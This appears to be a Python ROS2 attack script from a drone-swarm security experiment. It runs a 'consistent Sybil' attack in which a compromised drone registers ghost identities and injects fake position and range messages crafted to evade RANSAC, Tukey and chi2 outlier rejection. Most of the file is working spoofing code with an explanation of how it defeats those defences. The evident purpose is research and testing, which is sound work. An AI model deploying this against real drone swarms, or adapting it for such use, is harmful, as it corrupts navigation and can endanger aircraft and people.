#!/usr/bin/env python3
"""
Consistent Sybil Attack  (Enhancement 2 — defeats RANSAC and Tukey)
====================================================================
Standard Sybil (sybil_registry_attack.py) publishes ghost self_estimates
at fake positions but does NOT publish matching range vectors.  This means
honest drones compute residuals like:

    r = (ghost_pos - self_pos) - measured_range_to_ghost

where measured_range_to_ghost is real and ghost_pos is fake → large residual
→ RANSAC marks ghost as outlier → RANSAC partially mitigated.

This consistent variant closes that gap: the evil drone (px4_2) ALSO
publishes fake range vectors FROM px4_2 TO each ghost, consistent with the
ghost's claimed position.  Honest drones therefore compute:

    r = (ghost_pos - self_est) - fake_range_to_ghost ≈ 0

because fake_range_to_ghost = ghost_pos - evil_pos (exactly consistent).
Ghost measurements now have near-zero residuals and pass RANSAC inlier tests,
Tukey weight checks, and EKF chi2 gating.

Attack model:
  - Evil drone: px4_2 (real, registered, armed)
  - Ghosts: 3 synthetic identities (ghost_1, ghost_2, ghost_3)
  - Each ghost publishes a self_estimate at fake_pos_G
  - px4_2 publishes range_to/ghost_N = fake_pos_G - px4_2_spawn
    (makes the pair geometrically consistent from px4_2's perspective)
  - Since px4_2 is a legitimate peer, honest drones subscribe to
    /px4_2/coop/range_to/ghost_N as a normal range source

Threat model: compromised insider drone with full ROS2 publish access.

Run:
    ros2 run swarm_discovery sybil_consistent_attack
    ros2 run swarm_discovery sybil_consistent_attack 3 px4_2

STRIDE: Spoofing, Tampering (advanced — defeats outlier rejection)
Reference: Newsome et al., IPSN 2004; Douceur 2002
"""
import sys, csv, time
import numpy as np
import rclpy
from rclpy.node import Node
from std_msgs.msg import Header
from geometry_msgs.msg import PoseStamped, PointStamped
from swarm_msgs.msg import SwarmMember

NUM_GHOSTS    = 3
EVIL_DRONE    = "px4_2"
HONEST_DRONES = ["px4_1", "px4_3", "px4_4", "px4_5"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]
HEARTBEAT_HZ  = 2.0
PUBLISH_HZ    = 10.0
ATTACK_SEC    = 90.0
RAMP_SEC      = 20.0
LOG_FILE      = "/tmp/sybil_consistent_attack_metrics.csv"

SPAWN_POSITIONS = {
    "px4_1": np.array([0.0, 0.0, 0.0]),
    "px4_2": np.array([2.0, 0.0, 0.0]),
    "px4_3": np.array([4.0, 0.0, 0.0]),
    "px4_4": np.array([2.0, 2.0, 0.0]),
    "px4_5": np.array([4.0, 2.0, 0.0]),
}
EVIL_SPAWN = SPAWN_POSITIONS[EVIL_DRONE]


def ghost_config(n):
    """
    Place ghosts at positions that are geometrically plausible but wrong,
    and compute the consistent range vector that px4_2 would report.
    """
    configs = []
    for i in range(n):
        angle = 2 * np.pi * i / n
        # Ghost claimed position in world frame
        fake_pos = np.array([3.0 * np.cos(angle) + 2.0,
                             3.0 * np.sin(angle) + 1.0,
                             1.5])
        # Consistent range vector: what px4_2 would measure to this ghost
        # (fake_pos - evil_spawn) — this is what we inject on px4_2's range topic
        consistent_range = fake_pos - EVIL_SPAWN
        configs.append({
            "drone_ns":        f"ghost_{i+1}",
            "fake_pos":        fake_pos,
            "consistent_range": consistent_range,
        })
    return configs


class ConsistentSybilAttack(Node):
    def __init__(self, num_ghosts, evil_ns):
        super().__init__("sybil_consistent_attack")
        self.evil_ns    = evil_ns
        self.ghosts     = ghost_config(num_ghosts)
        self.start_time = time.monotonic()
        self.est        = {d: None for d in HONEST_DRONES}
        self.gt         = {d: None for d in ALL_DRONES}
        # Track evil drone's current estimated position (to compute dynamic ranges)
        self._evil_est  = EVIL_SPAWN.copy()

        # Heartbeat publisher — register ghosts in the swarm registry
        self.hb_pub = self.create_publisher(SwarmMember, "/swarm/heartbeat", 10)

        # Ghost self_estimate publishers
        self.est_pubs = {}
        for g in self.ghosts:
            ns = g["drone_ns"]
            self.est_pubs[ns] = self.create_publisher(
                PoseStamped, f"/{ns}/coop/self_estimate", 10)

        # Consistent range publishers: /px4_2/coop/range_to/ghost_N
        # These make px4_2's range to each ghost appear consistent with ghost_pos
        self.range_pubs = {}
        for g in self.ghosts:
            ns = g["drone_ns"]
            self.range_pubs[ns] = self.create_publisher(
                PointStamped, f"/{evil_ns}/coop/range_to/{ns}", 10)
            self.get_logger().warn(
                f"[SYBIL-CONSISTENT] Ghost {ns}: "
                f"fake_pos={g['fake_pos'].round(2)} "
                f"consistent_range={g['consistent_range'].round(2)}")

        # Subscribe to ground truth, estimates, evil drone position
        for drone in ALL_DRONES:
            self.create_subscription(
                PoseStamped, f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y,
                    msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(
                PoseStamped, f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y,
                    msg.pose.position.z])}), 10)
        self.create_subscription(
            PoseStamped, f"/{evil_ns}/coop/self_estimate",
            lambda msg: self._update_evil_est(msg), 10)

        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        header = ["t_s", "num_ghosts", "phase", "alpha", "attack_type"]
        for d in HONEST_DRONES:
            header += [f"{d}_est_x", f"{d}_est_y", f"{d}_est_z",
                       f"{d}_gt_x",  f"{d}_gt_y",  f"{d}_gt_z",
                       f"{d}_error_m"]
        self._csv.writerow(header)

        self.create_timer(1.0 / HEARTBEAT_HZ, self._send_heartbeats)
        self.create_timer(1.0 / PUBLISH_HZ,   self._tick)
        self.get_logger().warn(
            f"[SYBIL-CONSISTENT] {num_ghosts} ghosts with CONSISTENT range vectors | "
            f"evil={evil_ns} | This attack defeats RANSAC inlier checks")

    def _update_evil_est(self, msg):
        self._evil_est = np.array([
            msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])

    def _send_heartbeats(self):
        for g in self.ghosts:
            msg = SwarmMember()
            msg.header          = Header()
            msg.header.stamp    = self.get_clock().now().to_msg()
            msg.header.frame_id = "world"
            msg.drone_ns        = g["drone_ns"]
            msg.spawn_x         = float(g["fake_pos"][0])
            msg.spawn_y         = float(g["fake_pos"][1])
            msg.spawn_z         = float(g["fake_pos"][2])
            msg.drone_type      = "gz_x500"
            msg.is_armed        = True
            self.hb_pub.publish(msg)

    def _tick(self):
        elapsed = time.monotonic() - self.start_time
        if elapsed > ATTACK_SEC:
            self.get_logger().info("[SYBIL-CONSISTENT] Attack complete.")
            self._csv_file.flush(); self._csv_file.close()
            self.destroy_node(); return

        alpha = min(elapsed / RAMP_SEC, 1.0)
        phase = "warmup" if elapsed < 5.0 else "attack"

        for g in self.ghosts:
            # Publish ghost self_estimate at fake position
            pos = g["fake_pos"]
            est_msg = PoseStamped()
            est_msg.header.stamp       = self.get_clock().now().to_msg()
            est_msg.header.frame_id    = "world"
            est_msg.pose.position.x    = float(pos[0])
            est_msg.pose.position.y    = float(pos[1])
            est_msg.pose.position.z    = float(pos[2])
            est_msg.pose.orientation.w = 1.0
            self.est_pubs[g["drone_ns"]].publish(est_msg)

            if phase == "attack":
                # Publish CONSISTENT range vector from evil drone to ghost.
                # Use the evil drone's current estimated position to compute
                # the dynamic range vector (more realistic than fixed spawn offset).
                dynamic_range = pos - self._evil_est
                rng_msg = PointStamped()
                rng_msg.header.stamp    = self.get_clock().now().to_msg()
                rng_msg.header.frame_id = "world"
                rng_msg.point.x = float(dynamic_range[0] * alpha)
                rng_msg.point.y = float(dynamic_range[1] * alpha)
                rng_msg.point.z = float(dynamic_range[2] * alpha)
                self.range_pubs[g["drone_ns"]].publish(rng_msg)

        row = [f"{elapsed:.3f}", len(self.ghosts), phase,
               f"{alpha:.3f}", "consistent_sybil"]
        for drone in HONEST_DRONES:
            est, gt = self.est.get(drone), self.gt.get(drone)
            if est is not None and gt is not None:
                err = float(np.linalg.norm(est - gt))
                row += [f"{est[0]:.4f}", f"{est[1]:.4f}", f"{est[2]:.4f}",
                        f"{gt[0]:.4f}",  f"{gt[1]:.4f}",  f"{gt[2]:.4f}",
                        f"{err:.4f}"]
            else:
                row += [""] * 7
        self._csv.writerow(row)

        if int(elapsed) % 10 == 0 and int(elapsed * PUBLISH_HZ) % int(PUBLISH_HZ) == 0:
            for d in HONEST_DRONES:
                est, gt = self.est.get(d), self.gt.get(d)
                if est is not None and gt is not None:
                    self.get_logger().warn(
                        f"[SYBIL-CONSISTENT t={elapsed:.0f}s α={alpha:.2f}] "
                        f"{d} error={np.linalg.norm(est-gt):.3f}m")


def main():
    num_ghosts = int(sys.argv[1]) if len(sys.argv) > 1 else NUM_GHOSTS
    evil_ns    = sys.argv[2]      if len(sys.argv) > 2 else EVIL_DRONE
    rclpy.init()
    node = ConsistentSybilAttack(num_ghosts, evil_ns)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()

if __name__ == "__main__":
    main()
